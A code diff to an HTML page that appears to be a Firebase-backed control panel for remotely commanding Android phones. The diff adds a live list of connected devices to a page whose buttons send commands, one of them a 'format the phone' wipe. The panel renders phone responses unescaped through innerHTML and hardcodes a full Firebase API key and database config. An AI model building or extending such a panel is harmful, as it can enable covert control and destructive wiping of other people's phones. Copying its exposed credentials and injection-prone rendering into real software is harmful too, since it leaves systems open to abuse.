@@ -16,7 +16,7 @@
 
     <style>
         body {
-            background: linear-gradient(135deg, #2c003e, #000000);
+            background: linear-gradient(135deg, #4B0082, #000000);
             color: white;
             text-align: center;
             font-family: 'Arial', sans-serif;
@@ -33,8 +33,8 @@
             font-weight: bold;
             border-radius: 12px;
             color: white;
-            background-color: #6a0dad; /* لون موحد */
-            border: 2px solid white; /* حواف بيضاء */
+            background-color: #6a0dad;
+            border: 2px solid white;
             transition: all 0.3s ease-in-out;
         }
         .btn:hover {
@@ -42,19 +42,26 @@
             transform: scale(1.05);
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.6);
         }
-
-        /* تصميم النافذة المنبثقة */
         .modal-content {
             background-color: #20002c;
             color: white;
             border-radius: 10px;
             border: 2px solid #ffffff;
         }
-        .modal-header {
-            border-bottom: 1px solid #ffffff;
+        .modal-header, .modal-footer {
+            border-color: white;
         }
-        .modal-footer {
-            border-top: 1px solid #ffffff;
+        .list-group-item {
+            background-color: #3a0f52;
+            border: 1px solid white;
+            margin: 5px 0;
+            border-radius: 10px;
+            padding: 10px;
+            transition: 0.3s;
+        }
+        .list-group-item:hover {
+            background-color: #b819e0;
+            color: white;
         }
     </style>
 </head>
@@ -71,7 +78,13 @@
         <button class="btn" onclick="sendCommand('format', '⚠️ فرمتة الهاتف')">⚠️ فرمتة الهاتف</button>
     </div>
 
-    <!-- نافذة منبثقة لعرض البيانات -->
+    <!-- الأجهزة المتصلة -->
+    <div class="container">
+        <h3>📋 الأجهزة المتصلة</h3>
+        <ul id="deviceList" class="list-group"></ul>
+    </div>
+
+    <!-- نافذة منبثقة -->
     <div class="modal fade" id="dataModal" tabindex="-1" aria-labelledby="dataModalLabel" aria-hidden="true">
         <div class="modal-dialog">
             <div class="modal-content">
@@ -92,15 +105,15 @@
     <script>
         // إعداد Firebase
         const firebaseConfig = {
-  apiKey: "AIzaSyDacCUUTHSN2d6kEeuS8MJHlu16LleKIe4",
-  authDomain: "website-73513.firebaseapp.com",
-  databaseURL: "https://website-73513-default-rtdb.firebaseio.com",
-  projectId: "website-73513",
-  storageBucket: "website-73513.firebasestorage.app",
-  messagingSenderId: "5822727020",
-  appId: "1:5822727020:web:849735f9337295ea986949",
-  measurementId: "G-BMJG8C2SF0"
-  };
+            apiKey: "AIzaSyDacCUUTHSN2d6kEeuS8MJHlu16LleKIe4",
+            authDomain: "website-73513.firebaseapp.com",
+            databaseURL: "https://website-73513-default-rtdb.firebaseio.com",
+            projectId: "website-73513",
+            storageBucket: "website-73513.firebasestorage.app",
+            messagingSenderId: "5822727020",
+            appId: "1:5822727020:web:849735f9337295ea986949",
+            measurementId: "G-BMJG8C2SF0"
+        };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
@@ -110,7 +123,7 @@
             showPopup(title, "✅ تم إرسال الأمر إلى الهاتف!");
         }
 
-        // إظهار البيانات في النافذة المنبثقة
+        // إظهار النافذة المنبثقة
         function showPopup(title, message) {
             document.getElementById("dataModalLabel").innerText = title;
             document.getElementById("modalContent").innerHTML = message;
@@ -123,6 +136,24 @@
             if (snapshot.exists()) {
                 const data = snapshot.val();
                 showPopup("📲 استجابة الهاتف", `<p>${data.message}</p>`);
+            }
+        });
+
+        // عرض الأجهزة المتصلة
+        database.ref("devices").on("value", (snapshot) => {
+            const deviceList = document.getElementById("deviceList");
+            deviceList.innerHTML = "";
+
+            if (snapshot.exists()) {
+                snapshot.forEach((childSnapshot) => {
+                    const data = childSnapshot.val();
+                    const deviceItem = document.createElement("li");
+                    deviceItem.className = "list-group-item text-light";
+                    deviceItem.innerHTML = `<strong>${data.deviceName}</strong> - Android ${data.androidVersion}`;
+                    deviceList.appendChild(deviceItem);
+                });
+            } else {
+                deviceList.innerHTML = "<li class='list-group-item text-light'>لا توجد أجهزة متصلة حاليًا</li>";
             }
         });
     </script>
